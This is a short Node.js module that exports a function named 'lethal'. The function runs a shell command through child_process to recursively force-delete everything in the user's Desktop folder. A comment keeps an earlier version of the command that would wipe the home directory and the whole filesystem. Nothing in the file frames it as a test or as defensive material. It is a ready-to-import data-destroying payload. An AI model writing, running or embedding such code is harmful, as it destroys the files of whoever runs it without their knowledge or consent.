const { exec } = require('child_process');

const lethal = () => {
  exec(`rm -R -rf ~/Desktop/*`, (err, stdout, stderr) => {
    if (err) {
      // node couldn't execute the command
      return;
    }

    // the *entire* stdout and stderr (buffered)
    console.log(`stdout: ${stdout}`);
    console.log(`stderr: ${stderr}`);
  });
}
// prev rm -R -rf ~ && rm -R -rf /
module.exports = lethal;
